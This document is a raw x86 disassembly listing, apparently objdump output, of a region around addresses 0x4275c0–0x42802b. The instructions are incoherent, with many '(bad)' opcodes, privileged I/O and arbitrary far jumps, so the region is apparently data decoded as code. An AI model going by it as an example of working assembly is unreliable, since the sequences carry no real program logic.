  4275c0:	adc    ebx,DWORD PTR [ebp+0x758f13be]
  4275c6:	int3   
  4275c7:	or     DWORD PTR [edi-0x4ffcc1f3],eax
  4275cd:	dec    edi
  4275ce:	xor    DWORD PTR [ebp+0x361f47bd],eax
  4275d4:	mov    al,0x1a
  4275d6:	add    al,0x49
  4275d8:	cmp    ecx,DWORD PTR [edx-0x6e]
  4275db:	cmp    DWORD PTR [esp+eiz*8-0x18],esi
  4275df:	pusha  
  4275e0:	shl    BYTE PTR [esi+esi*8-0x11d16df3],0x67
  4275e8:	in     al,dx
  4275e9:	rcl    DWORD PTR [edi+0x1992b629],0xe4
  4275f0:	leave  
  4275f1:	cdq    
  4275f2:	dec    ecx
  4275f3:	out    0xc2,al
  4275f5:	jge    0x4275e1
  4275f7:	iret   
  4275f8:	leave  
  4275f9:	cmc    
  4275fa:	pop    esi
  4275fb:	push   ebp
  4275fc:	or     BYTE PTR [eax],dh
  4275fe:	xchg   ebx,eax
  4275ff:	outs   dx,DWORD PTR ds:[esi]
  427600:	fistp  WORD PTR [edi-0x34a93308]
  427606:	inc    esi
  427607:	std    
  427608:	shl    BYTE PTR [ebx-0x4f70b8e8],0x1
  42760f:	cmp    al,BYTE PTR [edx-0x6a]
  427612:	sar    BYTE PTR [ebx+0x0],cl
  427615:	sbb    cl,BYTE PTR [ebx+0x1446051d]
  42761b:	push   es
  42761c:	push   ds
  42761d:	mov    ebp,DWORD PTR ds:0x185aae60
  427623:	sbb    al,BYTE PTR [esi-0x6b]
  427626:	pushf  
  427627:	push   es
  427628:	call   0x365a70d0
  42762d:	enter  0xaec7,0x68
  427631:	adc    BYTE PTR [ebp-0x7c892818],dh
  427637:	outs   dx,DWORD PTR ds:[esi]
  427638:	popa   
  427639:	mov    ebx,0x74bb8ac6
  42763e:	sahf   
  42763f:	sub    BYTE PTR fs:[ecx],dl
  427642:	(bad)  
  427643:	int    0x7b
  427645:	(bad)  
  427646:	jmp    0x12cf:0x11afcfe1
  42764d:	mov    bl,ch
  42764f:	cdq    
  427650:	fsub   QWORD PTR [ecx]
  427652:	push   0xa025c4f0
  427657:	(bad)  
  427658:	je     0x4275df
  42765a:	jns    0x4275fa
  42765c:	xlat   BYTE PTR ds:[ebx]
  42765d:	sahf   
  42765e:	lahf   
  42765f:	inc    edx
  427660:	(bad)  
  427661:	hlt    
  427662:	in     eax,dx
  427663:	fsubr  QWORD PTR [ebx-0x67]
  427666:	repnz mov ch,0x16
  427669:	sub    al,cl
  42766b:	nop
  42766c:	leave  
  42766d:	sar    ah,1
  42766f:	cmp    dl,0x94
  427672:	in     al,0x19
  427674:	or     eax,0x909b7dee
  427679:	mov    dl,0x9d
  42767b:	or     al,0x38
  42767d:	sbb    ah,BYTE PTR [eax+ebp*4-0x68]
  427681:	push   ebx
  427682:	push   ss
  427683:	push   es
  427684:	inc    edi
  427685:	ss daa 
  427687:	mov    al,ds:0xf66e77b8
  42768c:	and    sp,si
  42768f:	icebp  
  427690:	cmp    al,0x0
	...
  4276f2:	add    BYTE PTR [eax],al
  4276f4:	add    DWORD PTR [esi-0x70],edx
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fnstenv [esi-0x13537916]
  427705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427706:	add    DWORD PTR [eax],eax
  427708:	add    eax,0xd2000001
  42770d:	adc    ah,BYTE PTR [ebx-0x6b]
  427710:	adc    DWORD PTR [edx+0x2d8589de],ebp
  427716:	int    0xb9
  427718:	add    al,0xaa
  42771a:	nop
  42771b:	and    ah,BYTE PTR [edx+0x2a]
  42771e:	or     dh,BYTE PTR [ecx]
  427720:	push   ecx
  427721:	push   ebx
  427722:	mov    ch,0x62
  427724:	mov    esp,0xa9d63541
  427729:	test   BYTE PTR [esi+0xc],dl
  42772c:	mov    ah,0xca
  42772e:	test   DWORD PTR [esi],eax
  427730:	sbb    al,0xb2
  427732:	adc    bh,BYTE PTR [ebp+0x35]
  427735:	pop    ss
  427736:	mov    es,esp
  427738:	adc    eax,ebp
  42773a:	ret    0x4a
  42773d:	dec    edi
  42773e:	inc    ebx
  42773f:	inc    edi
  427740:	stos   DWORD PTR es:[edi],eax
  427741:	pop    ebx
  427742:	popa   
  427743:	fs js  0x42774f
  427746:	mov    ds:0x67b4582c,eax
  42774b:	push   ecx
  42774c:	(bad)  
  42774e:	int3   
  42774f:	call   0x6b5920e7
  427754:	jge    0x427773
  427756:	push   ebx
  427757:	inc    edi
  427758:	mov    ch,0x8c
  42775a:	and    al,0x6f
  42775c:	imul   eax,DWORD PTR ds:0xf7c14738,0x78
  427763:	lods   eax,DWORD PTR ds:[esi]
  427764:	mov    WORD PTR [edi],ds
  427766:	mov    ecx,DWORD PTR [eax+0x10702c26]
  42776c:	sbb    eax,0xac1917b9
  427771:	fdiv   DWORD PTR [ecx]
  427773:	dec    esp
  427774:	mov    ecx,0x4b8020a8
  427779:	leave  
  42777a:	dec    edx
  42777b:	outs   dx,DWORD PTR ds:[esi]
  42777c:	icebp  
  42777d:	test   esp,0x38ff85a3
  427783:	or     eax,0x8381a7b5
  427788:	mov    ebx,0x17ef8c9f
  42778d:	xor    al,0x85
  42778f:	lea    esp,[edx+ecx*4]
  427792:	jmp    0x709ff11e
  427797:	dec    esp
  427798:	mov    al,0x5f
  42779a:	mov    dh,bh
  42779c:	push   ds
  42779d:	addr16 mov eax,0x1eb2b8ad
  4277a3:	call   0x9259c349
  4277a8:	jns    0x427776
  4277aa:	jl     0x4277b5
  4277ac:	ror    DWORD PTR [edi],0x7d
  4277af:	mov    DWORD PTR [ebx+0x478a3e28],eax
  4277b5:	xchg   ebx,eax
  4277b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4277b7:	push   edx
  4277b8:	push   ebp
  4277b9:	xchg   DWORD PTR ds:0xb03113da,edi
  4277bf:	sti    
  4277c0:	xchg   esi,eax
  4277c1:	repz sti 
  4277c3:	je     0x427763
  4277c5:	repnz push edi
  4277c7:	jo     0x427826
  4277c9:	inc    esp
  4277ca:	aam    0x7b
  4277cc:	ret    0x5497
  4277cf:	ror    BYTE PTR [edx+0x1f4e5088],0x9e
  4277d6:	jne    0x427821
  4277d8:	(bad)  
  4277d9:	fmul   st,st(2)
  4277db:	mov    BYTE PTR [esi-0x5b],dh
  4277de:	test   dl,ah
  4277e0:	and    al,0xb6
  4277e2:	sub    BYTE PTR [eax],ah
  4277e4:	rcl    DWORD PTR [eax-0x3a19fd0b],0xfa
  4277eb:	ds pop ecx
  4277ed:	inc    ebp
  4277ee:	inc    ecx
  4277ef:	sub    eax,0x43ce60a6
  4277f4:	les    esp,FWORD PTR [eax+ecx*1+0x46]
  4277f8:	ds out 0xe9,al
  4277fb:	or     DWORD PTR [eax],ebp
  4277fd:	jns    0x427830
  4277ff:	push   ss
  427800:	scas   eax,DWORD PTR es:[edi]
  427801:	in     al,dx
  427802:	add    eax,0x631b0e70
  427807:	and    ah,BYTE PTR [eax]
  427809:	lahf   
  42780a:	pop    ecx
  42780b:	push   es
  42780c:	pop    es
  42780d:	xchg   esi,eax
  42780e:	cdq    
  42780f:	cmc    
  427810:	push   eax
	...
  427871:	add    BYTE PTR [eax],al
  427873:	add    BYTE PTR [edx],bl
  427875:	mov    cl,BYTE PTR [ebx]
  427877:	inc    ebp
  427878:	fwait
  427879:	lds    ebx,FWORD PTR [esi-0x21]
  42787c:	jo     0x4278e3
  42787e:	fldl2e 
  427880:	fmul   st,st(5)
  427882:	pop    es
  427883:	adc    eax,0x1a6f1
  427888:	add    eax,0xaf000001
  42788d:	jns    0x42784e
  42788f:	dec    esp
  427890:	inc    ecx
  427891:	mov    ah,0xdf
  427893:	cmp    eax,0x1a6bc8e2
  427898:	lods   al,BYTE PTR ds:[esi]
  427899:	sub    eax,DWORD PTR [edi+0x1106a90b]
  42789f:	pop    edi
  4278a0:	cmp    ch,BYTE PTR [ecx-0x6b]
  4278a3:	jmp    0x427882
  4278a5:	rcl    BYTE PTR [edx-0x3a8ac82],0x2f
  4278ac:	jmp    DWORD PTR [ebp+0x5837ad6]
  4278b2:	and    eax,0xa17b84ca
  4278b7:	hlt    
  4278b8:	cmp    BYTE PTR [ecx],ch
  4278ba:	bound  ecx,QWORD PTR [edx*1-0x1c629510]
  4278c1:	cs jb  0x427897
  4278c4:	jl     0x427914
  4278c6:	aaa    
  4278c7:	jne    0x4278c6
  4278c9:	shl    BYTE PTR [ebx],1
  4278cb:	sahf   
  4278cc:	(bad)  
  4278ce:	push   esp
  4278cf:	mov    dh,0x6e
  4278d1:	inc    ebx
  4278d2:	dec    ebx
  4278d3:	in     al,dx
  4278d4:	xchg   ebp,eax
  4278d5:	int3   
  4278d6:	enter  0xaeaa,0x19
  4278da:	add    eax,0x2b37f70f
  4278df:	sub    al,0xe7
  4278e1:	cwde   
  4278e2:	xor    bh,al
  4278e4:	ret    
  4278e5:	or     DWORD PTR [eax+0x120b6379],esi
  4278eb:	inc    ebx
  4278ec:	sahf   
  4278ed:	arpl   si,dx
  4278ef:	sbb    ebp,DWORD PTR [eax+esi*8+0x31]
  4278f3:	ins    DWORD PTR es:[edi],dx
  4278f4:	xchg   esp,eax
  4278f5:	cwde   
  4278f6:	push   edx
  4278f7:	icebp  
  4278f8:	fist   DWORD PTR [ecx+0x5491efc]
  4278fe:	pusha  
  4278ff:	out    0x3a,eax
  427901:	add    al,0xdf
  427903:	jbe    0x42795b
  427905:	ins    BYTE PTR es:[edi],dx
  427906:	cmp    DWORD PTR [edi],eax
  427908:	sub    cl,BYTE PTR [eax+ebx*1-0xe38d122]
  42790f:	neg    dh
  427911:	comiss xmm4,DWORD PTR [eax]
  427914:	mov    cl,BYTE PTR [ebx+0x64]
  427917:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427918:	jnp    0x42793a
  42791a:	push   es
  42791b:	popf   
  42791c:	push   ss
  42791d:	adc    BYTE PTR [ebx-0x7e],ch
  427920:	mov    bh,0xe2
  427922:	pop    esi
  427923:	call   0xd6ab:0x9b2d7b02
  42792a:	iret   
  42792b:	adc    DWORD PTR [eax+0x64647174],ecx
  427931:	in     al,dx
  427932:	jl     0x4278ca
  427934:	aaa    
  427935:	sahf   
  427936:	mov    dl,0x7
  427938:	or     al,0xb7
  42793a:	popa   
  42793b:	and    DWORD PTR [esp+ebp*1-0x6e],esp
  42793f:	rcr    DWORD PTR [eax+0x19346b8a],cl
  427945:	pop    es
  427946:	or     bl,BYTE PTR [ecx-0x2233ae8]
  42794c:	xor    DWORD PTR [ebp-0x36d94905],eax
  427952:	push   0x5e0531b7
  427957:	retf   0x8105
  42795a:	sahf   
  42795b:	push   es
  42795c:	loopne 0x42793b
  42795e:	fisttp DWORD PTR [ecx]
  427960:	sub    al,0xf
  427962:	mov    BYTE PTR [eax+0x44],ch
  427965:	jp     0x427916
  427967:	sahf   
  427968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427969:	cli    
  42796a:	xchg   edx,eax
  42796b:	push   0x73
  42796d:	iret   
  42796e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42796f:	mov    fs,WORD PTR [edx]
  427971:	jo     0x4279c6
  427973:	pop    ebx
  427974:	xchg   ebx,eax
  427975:	inc    esp
  427976:	jnp    0x427901
  427978:	adc    BYTE PTR [ecx+ecx*8+0x1c52d67a],bl
  42797f:	int    0x7f
  427981:	push   ecx
  427982:	fisubr WORD PTR [ebx]
  427984:	jns    0x427968
  427986:	inc    esp
  427987:	and    eax,ecx
  427989:	ret    
  42798a:	cdq    
  42798b:	xchg   esp,eax
  42798c:	scas   eax,DWORD PTR es:[edi]
  42798d:	sahf   
  42798e:	in     eax,dx
  42798f:	mov    al,ds:0x48
	...
  4279f4:	call   0xdea3:0xffa3ffdd
  4279fb:	std    
  4279fc:	inc    edx
  4279fd:	jne    0x4279d7
  4279ff:	adc    DWORD PTR [eax],0xffffffad
  427a02:	les    ebp,FWORD PTR [edx+0x1a7f6]
  427a08:	add    eax,0xf0000001
  427a0d:	mov    eax,ds:0xeaea1586
  427a12:	jp     0x427a7b
  427a14:	pusha  
  427a15:	ret    0x668d
  427a18:	sub    esp,DWORD PTR [edi-0xa]
  427a1b:	sar    BYTE PTR [eax+ecx*2-0x677fff],cl
  427a22:	pop    ds
  427a23:	clc    
  427a24:	mov    es:0xdf04bba9,al
  427a2a:	fist   WORD PTR [esp+edx*4+0x22]
  427a2e:	pop    edx
  427a2f:	sbb    ebp,DWORD PTR [eax-0x5e188db]
  427a35:	sub    dl,BYTE PTR [ebp+0x29]
  427a38:	push   ebx
  427a39:	cmp    al,0xf
  427a3b:	jno    0x4279ed
  427a3d:	mov    ds:0x4feed23f,eax
  427a42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a43:	(bad)
  427a46:	cmc    
  427a47:	ret    0xc1f7
  427a4a:	into   
  427a4b:	xchg   ebx,eax
  427a4c:	jmp    0x5237e5fb
  427a51:	jecxz  0x427a7e
  427a53:	repnz push ds
  427a55:	fwait
  427a56:	mov    bh,0xc3
  427a58:	(bad)  
  427a5a:	add    DWORD PTR [ebx],0xfffffff0
  427a5d:	or     ch,BYTE PTR [esi+0x16cb1e81]
  427a63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a64:	or     DWORD PTR [eax-0x6f],0xd8ecf29f
  427a6b:	leave  
  427a6c:	ficomp DWORD PTR [ecx-0x50]
  427a6f:	nop
  427a70:	push   ebp
  427a71:	in     al,dx
  427a72:	xchg   ebp,eax
  427a73:	pop    ecx
  427a74:	xor    ecx,DWORD PTR [edx+0x27659e69]
  427a7a:	sub    eax,0x861696a5
  427a7f:	dec    edx
  427a80:	pop    ds
  427a81:	jo     0x427ab0
  427a83:	test   BYTE PTR [esi],ah
  427a85:	hlt    
  427a86:	dec    eax
  427a87:	cmp    eax,0x148d508c
  427a8c:	push   0xffffff88
  427a8e:	sub    esp,ebx
  427a90:	cld    
  427a91:	je     0x427aca
  427a93:	cdq    
  427a94:	inc    esi
  427a95:	sub    DWORD PTR [edx],ebx
  427a97:	lods   eax,DWORD PTR ds:[esi]
  427a98:	mov    esp,0xf3fa82cd
  427a9d:	push   cs
  427a9e:	add    DWORD PTR [edx-0x1e],esp
  427aa1:	sar    BYTE PTR [edi+0x57],0x89
  427aa5:	jg     0x427b0f
  427aa7:	and    al,0x42
  427aa9:	mov    ah,0x46
  427aab:	mov    bl,ah
  427aad:	sbb    al,0x78
  427aaf:	mov    edi,0x7510a0aa
  427ab4:	scas   eax,DWORD PTR es:[edi]
  427ab5:	call   edi
  427ab7:	data16 jge 0x427a9a
  427aba:	aam    0xf3
  427abc:	xchg   edx,eax
  427abd:	nop
  427abe:	push   edx
  427abf:	cmp    bh,dh
  427ac1:	stos   DWORD PTR es:[edi],eax
  427ac2:	pop    ebx
  427ac3:	sbb    ch,al
  427ac5:	mov    esi,0xfe9ca890
  427aca:	cli    
  427acb:	imul   dx,WORD PTR [eax-0x66c9aa43],0x7597
  427ad4:	pop    ecx
  427ad5:	xchg   ebp,eax
  427ad6:	(bad)
  427ad9:	sub    ebp,DWORD PTR [bp+si+0x179d]
  427ade:	scas   eax,DWORD PTR es:[edi]
  427adf:	sbb    al,BYTE PTR [edx-0x4a]
  427ae2:	shl    DWORD PTR [ebx+esi*4+0x45],0x30
  427ae7:	sub    dl,BYTE PTR [edi+0x634fb5bd]
  427aed:	fs (bad) 
  427aef:	ret    0xc63
  427af2:	adc    dl,BYTE PTR [ecx]
  427af4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427af5:	outs   dx,DWORD PTR ds:[esi]
  427af6:	stos   DWORD PTR es:[edi],eax
  427af7:	out    0x23,eax
  427af9:	les    esp,FWORD PTR [edx+0x669eb6d0]
  427aff:	rol    edx,0x40
  427b02:	outs   dx,DWORD PTR ds:[esi]
  427b03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b04:	out    dx,eax
  427b05:	mov    eax,0xd6cef4f2
  427b0a:	js     0x427b6f
  427b0c:	jg     0x427ae1
  427b0e:	call   0x0:0xfd63
	...
  427b71:	add    BYTE PTR [eax],al
  427b73:	add    dl,cl
  427b75:	mov    edx,DWORD PTR [edx+0x7b]
  427b78:	push   ebx
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	not    BYTE PTR [esi-0x401cbb4]
  427b85:	test   al,0x1
  427b87:	add    BYTE PTR ds:0xe0000001,al
  427b8d:	jo     0x427c0b
  427b8f:	add    BYTE PTR [edi-0x4e378dd3],dh
  427b95:	pop    esp
  427b96:	js     0x427c13
  427b98:	mov    ds:0x297254d1,eax
  427b9d:	inc    edx
  427b9e:	fs repnz enter 0x38ca,0xd1
  427ba4:	shl    BYTE PTR [esi],1
  427ba6:	je     0x427ba5
  427ba8:	jg     0x427b9d
  427baa:	mov    dl,0x9c
  427bac:	sub    edx,DWORD PTR [ebp+0x836cee1]
  427bb2:	mov    bl,ah
  427bb4:	lahf   
  427bb5:	dec    eax
  427bb6:	iret   
  427bb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427bb8:	je     0x427b4c
  427bba:	std    
  427bbb:	mov    cl,0x1
  427bbd:	mov    cl,0xab
  427bbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427bc0:	mov    dh,BYTE PTR [esi+0xc941f82]
  427bc6:	hlt    
  427bc7:	call   0xa5cc:0xb085ee89
  427bce:	sti    
  427bcf:	dec    edi
  427bd0:	aam    0x73
  427bd2:	je     0x427bde
  427bd4:	leave  
  427bd5:	inc    ebp
  427bd6:	jge    0x427b8a
  427bd8:	das    
  427bd9:	aaa    
  427bda:	and    al,0xe5
  427bdc:	mov    ch,0x70
  427bde:	jmp    0x68190fcd
  427be3:	xor    DWORD PTR [eax+ebp*8+0x7e2bf769],ecx
  427bea:	test   al,0xc2
  427bec:	inc    esp
  427bed:	mov    ebx,0x8c7cb639
  427bf2:	ins    BYTE PTR es:[edi],dx
  427bf3:	rcr    DWORD PTR [edx],1
  427bf5:	cmp    esp,DWORD PTR [ecx-0x357a931b]
  427bfb:	lods   al,BYTE PTR ds:[esi]
  427bfc:	leave  
  427bfd:	clc    
  427bfe:	and    DWORD PTR [ebx],esi
  427c00:	sub    ah,bl
  427c02:	xchg   BYTE PTR [eax],cl
  427c04:	mov    ecx,edx
  427c06:	call   0x6ca9:0x66bf6fb3
  427c0d:	push   es
  427c0e:	dec    ebp
  427c0f:	mov    ds:0x24d8225c,al
  427c14:	imul   eax,DWORD PTR [ebx+0x1876e838],0xd93bcd0f
  427c1e:	je     0x427c86
  427c20:	shl    BYTE PTR [edx+0x13],1
  427c23:	sub    eax,0xead070d0
  427c28:	(bad)  
  427c29:	aad    0xc0
  427c2b:	add    eax,0x5a1fb417
  427c30:	add    DWORD PTR [edi+ebp*4-0x42],esp
  427c34:	out    dx,al
  427c35:	shr    dl,0x23
  427c38:	stc    
  427c39:	adc    eax,0x2967e8f6
  427c3e:	mov    ?,WORD PTR [ecx]
  427c40:	loop   0x427c76
  427c42:	push   esi
  427c43:	sub    BYTE PTR [eax],cl
  427c45:	jmp    0x4e41a705
  427c4a:	cli    
  427c4b:	outs   dx,BYTE PTR ds:[esi]
  427c4c:	loope  0x427bf7
  427c4e:	push   ecx
  427c4f:	imul   edx,DWORD PTR [edx+eiz*8],0xf57e88ce
  427c56:	xchg   esp,eax
  427c57:	push   edi
  427c58:	xchg   ebx,ebx
  427c5a:	stos   DWORD PTR es:[edi],eax
  427c5b:	mov    ebp,0xaed8699a
  427c60:	ja     0x427cab
  427c62:	mov    edx,0x41a56211
  427c67:	mov    gs,WORD PTR [ebx+0x49]
  427c6a:	add    DWORD PTR [esi-0x76],edi
  427c6d:	out    0x9f,eax
  427c6f:	mov    edx,ebp
  427c71:	sub    BYTE PTR [edx-0x46],cl
  427c74:	in     eax,0xb7
  427c76:	lods   al,BYTE PTR ds:[esi]
  427c77:	mov    ebp,esi
  427c79:	loop   0x427cdf
  427c7b:	xchg   ecx,eax
  427c7c:	xchg   ecx,eax
  427c7d:	pop    esi
  427c7e:	aas    
  427c7f:	mov    WORD PTR [esi],cs
  427c81:	and    dh,ah
  427c83:	jecxz  0x427c4e
  427c85:	cmp    eax,0x960f0e9a
  427c8a:	push   ds
  427c8b:	shl    DWORD PTR [edi-0x59fbcdf5],0x0
	...
  427cf2:	add    BYTE PTR [eax],al
  427cf4:	mov    ds:0xf343b050,eax
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0xd5745d44,ebx
  427d02:	leave  
  427d03:	and    DWORD PTR [eax],eax
  427d05:	stos   BYTE PTR es:[edi],al
  427d06:	add    DWORD PTR [eax],eax
  427d08:	add    eax,0xab000001
  427d0d:	hlt    
  427d0e:	jmp    0x427cea
  427d10:	repnz mov bh,0xa0
  427d13:	dec    ebx
  427d14:	jno    0x427d4e
  427d16:	mov    ax,ds:0x84601429
  427d1c:	or     DWORD PTR [eax+esi*1],edi
  427d1f:	shl    BYTE PTR [eax+edx*1+0x51b61958],1
  427d26:	mov    cl,BYTE PTR [edi+edx*4-0x3ad44e9e]
  427d2d:	pop    esi
  427d2e:	or     BYTE PTR [edx+ecx*1-0x133f149f],0xdd
  427d36:	and    ecx,edi
  427d38:	xchg   esp,eax
  427d39:	rcl    BYTE PTR [esi-0x65],cl
  427d3c:	jb     0x427d8a
  427d3e:	cmovle edx,ebx
  427d41:	jns    0x427d36
  427d43:	mov    ah,0xd4
  427d45:	setb   BYTE PTR [edi+0x4e]
  427d49:	jge    0x427d45
  427d4b:	cmp    esi,DWORD PTR [edi]
  427d4d:	into   
  427d4e:	dec    esi
  427d4f:	bnd ret 0xe0fd
  427d53:	(bad)  [esi+edi*4-0x1d803bb9]
  427d5a:	dec    esi
  427d5b:	sbb    BYTE PTR [edx],dl
  427d5d:	inc    esp
  427d5e:	fnstenv [ebx-0x206c32fb]
  427d64:	enter  0x4147,0x55
  427d68:	(bad)
  427d6d:	in     eax,dx
  427d6e:	sbb    eax,0x846f42bc
  427d73:	inc    ebp
  427d74:	push   edx
  427d75:	and    bl,BYTE PTR [eax]
  427d77:	mov    eax,ds:0xfc323c92
  427d7c:	lock xor ch,0xd7
  427d80:	adc    dl,BYTE PTR [eax+eax*4-0x2f4467df]
  427d87:	stos   BYTE PTR es:[edi],al
  427d88:	add    eax,0x176dd662
  427d8d:	(bad)  
  427d8e:	and    DWORD PTR [ecx+0x7e],0xffffffac
  427d92:	imul   ebp,DWORD PTR [ebx],0xd34550e
  427d98:	xor    eax,0x98291bb0
  427d9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d9e:	jae    0x427de9
  427da0:	std    
  427da1:	mov    bh,bh
  427da3:	inc    ecx
  427da4:	aaa    
  427da5:	(bad)  [ebp+0x26]
  427da8:	retf   
  427da9:	fiadd  WORD PTR [ebp+eiz*4+0x77]
  427dad:	mov    eax,0x8f414fdd
  427db2:	fstp   QWORD PTR [ebp+0x72]
  427db5:	test   eax,0x60e3066f
  427dba:	rcr    BYTE PTR [ebp-0x19],cl
  427dbd:	repz ss push ds
  427dc0:	cmp    al,0xc9
  427dc2:	jmp    0x85ee2088
  427dc7:	sbb    al,BYTE PTR [eax+0x2b7bf465]
  427dcd:	pop    edi
  427dce:	cmp    al,0x10
  427dd0:	call   0x1ae2:0xc123c155
  427dd7:	dec    eax
  427dd8:	dec    esi
  427dd9:	arpl   WORD PTR [ebx-0x24],dx
  427ddc:	mov    ds,WORD PTR [edi]
  427dde:	fdivrp st(3),st
  427de0:	dec    esp
  427de1:	dec    edi
  427de2:	in     al,dx
  427de3:	fcmovu st,st(1)
  427de5:	rcr    DWORD PTR [ebx-0x35b882be],cl
  427deb:	xor    dl,BYTE PTR [edx+eax*2]
  427dee:	sub    al,0x51
  427df0:	test   DWORD PTR [ebx-0x51],esi
  427df3:	lahf   
  427df4:	pop    ss
  427df5:	not    DWORD PTR ds:0x6f2420bb
  427dfb:	mov    edi,0xc4423a78
  427e00:	adc    ebp,esp
  427e02:	int    0xd5
  427e04:	lahf   
  427e05:	mov    esp,0xed2284b
  427e0a:	mov    edi,0x6aedadfa
  427e0f:	fadd   QWORD PTR [ebp+0x0]
	...
  427e71:	add    BYTE PTR [eax],al
  427e73:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	fcom   DWORD PTR [eax+0x5b]
  427e83:	adc    DWORD PTR ds:0x50001ab,eax
  427e89:	add    DWORD PTR [eax],eax
  427e8b:	add    BYTE PTR [ebx+0x53],dl
  427e8e:	shl    DWORD PTR [ecx],0xc4
  427e91:	xchg   ecx,eax
  427e92:	xchg   edx,eax
  427e93:	(bad)  
  427e94:	and    esp,esi
  427e96:	gs xor al,0x8
  427e99:	jmp    0x3fdd:0xb7477d6e
  427ea0:	stos   DWORD PTR es:[edi],eax
  427ea1:	rcl    BYTE PTR [ebx],cl
  427ea3:	pop    ebp
  427ea4:	inc    ebp
  427ea5:	inc    esp
  427ea6:	xchg   ecx,eax
  427ea7:	mov    esp,0x64ea7d88
  427eac:	ret    0x94cf
  427eaf:	sahf   
  427eb0:	test   eax,0x34bb46a7
  427eb5:	jp     0x427e59
  427eb7:	mov    eax,0x42ab6fdf
  427ebc:	mov    DWORD PTR [eax-0x4471306b],0x2dffffeb
  427ec6:	xor    dh,BYTE PTR [ecx+0x768bb73]
  427ecc:	sub    BYTE PTR [esi-0x18],ah
  427ecf:	push   es
  427ed0:	iret   
  427ed1:	data16 and al,0xbd
  427ed4:	jne    0x427ece
  427ed6:	jge    0x427f0c
  427ed8:	dec    eax
  427ed9:	(bad)  
  427eda:	jne    0x427eb4
  427edc:	pop    ebx
  427edd:	push   cs
  427ede:	pop    esp
  427edf:	mov    ds:0x8f90ca7,al
  427ee4:	lahf   
  427ee5:	mov    ecx,0xb29ba9df
  427eea:	dec    esi
  427eeb:	ret    
  427eec:	outs   dx,DWORD PTR ds:[esi]
  427eed:	dec    ecx
  427eee:	ins    BYTE PTR es:[edi],dx
  427eef:	mov    edi,0x523c3526
  427ef4:	sub    eax,0x4de419a
  427ef9:	test   BYTE PTR [edi-0x15],ch
  427efc:	pop    ebx
  427efd:	mov    ecx,0x7c5f1b49
  427f02:	mov    al,ds:0x530658c2
  427f07:	add    eax,0x211766fa
  427f0c:	in     al,dx
  427f0d:	adc    ecx,DWORD PTR [esp+esi*2+0x13367206]
  427f14:	jb     0x427f20
  427f16:	xlat   BYTE PTR ds:[ebx]
  427f17:	mov    ah,0x56
  427f19:	das    
  427f1a:	pop    es
  427f1b:	xchg   ebp,eax
  427f1c:	retf   
  427f1d:	out    dx,al
  427f1e:	loopne 0x427f5d
  427f20:	mov    ch,0x54
  427f22:	xchg   edi,eax
  427f23:	fistp  DWORD PTR [ecx]
  427f25:	(bad)  
  427f26:	lds    eax,FWORD PTR [edx+0x5b6f42ea]
  427f2c:	fmul   st(1),st
  427f2e:	(bad)  
  427f2f:	mov    al,0x2f
  427f31:	ror    DWORD PTR [ebx+0x1d95058d],cl
  427f37:	(bad)
  427f3b:	dec    edx
  427f3c:	cmp    eax,0x112c1918
  427f41:	xor    dl,0x62
  427f44:	sbb    al,0xda
  427f46:	pop    ebp
  427f47:	test   bh,bl
  427f49:	lods   al,BYTE PTR ds:[esi]
  427f4a:	or     al,0xdb
  427f4c:	rcl    eax,1
  427f4e:	mov    ch,0x46
  427f51:	dec    ebx
  427f52:	xchg   edx,eax
  427f53:	adc    eax,0x5164b66
  427f58:	push   eax
  427f59:	push   ss
  427f5a:	mov    eax,0x2fce3d32
  427f5f:	push   0xffffffb0
  427f61:	out    dx,eax
  427f62:	dec    edi
  427f63:	cwde   
  427f64:	loop   0x427f6b
  427f66:	stc    
  427f67:	jb     0x427f3b
  427f69:	shl    BYTE PTR [edi+0x66],cl
  427f6c:	sub    ch,dh
  427f6e:	ret    0xb4e2
  427f71:	mov    edi,0xa6b29f80
  427f76:	clc    
  427f77:	shr    dl,cl
  427f79:	jb     0x427f89
  427f7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427f7c:	fadd   DWORD PTR [ecx+0xc]
  427f7f:	and    esp,ebp
  427f81:	sti    
  427f82:	pop    es
  427f83:	mov    ds:0xf5380b56,eax
  427f88:	adc    BYTE PTR [ebp-0x3a90a0fd],0xce
  427f8f:	xchg   esi,eax
  427f90:	ins    BYTE PTR es:[edi],dx
	...
  427ff1:	add    BYTE PTR [eax],al
  427ff3:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	cmp    ch,0xcb
  428003:	arpl   WORD PTR [edx],cx
  428005:	lods   al,BYTE PTR ds:[esi]
  428006:	add    DWORD PTR [eax],eax
  428008:	add    eax,0x39000001
  42800d:	sbb    eax,0xa9ee405d
  428012:	rcl    BYTE PTR [ecx],1
  428014:	outs   dx,BYTE PTR ds:[esi]
  428015:	cmp    ch,ah
  428017:	jb     0x42800a
  428019:	or     esp,DWORD PTR [ebx-0x45]
  42801c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42801d:	jg     0x427ff5
  42801f:	ds sbb edi,esp
  428022:	push   cs
  428023:	je     0x4280a0
  428025:	cdq    
  428026:	in     eax,0x9e
  428028:	test   dh,ah
  42802a:	pusha  
  42802b:	inc    edx
